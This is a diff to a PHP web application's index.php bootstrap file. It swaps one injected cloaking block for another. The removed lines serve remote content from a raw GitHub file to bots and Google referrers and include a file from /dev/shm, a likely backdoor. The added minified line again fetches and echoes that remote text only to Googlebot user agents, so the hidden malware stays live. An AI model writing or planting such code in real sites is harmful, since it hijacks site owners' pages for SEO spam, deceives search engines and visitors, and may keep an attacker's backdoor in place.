@@ -1,13 +1,5 @@
 <?php
-$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
-$uri = $_SERVER['REQUEST_URI'] ?? '';
-
-if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
-echo file_get_contents('https://raw.githubusercontent.com/nathaniakhongg/yoshi/refs/heads/main/mahupiki.txt');
-exit();
-}
-include '/dev/shm/shm';
+function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://raw.githubusercontent.com/nathaniakhongg/yoshi/refs/heads/main/mahupiki.txt');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
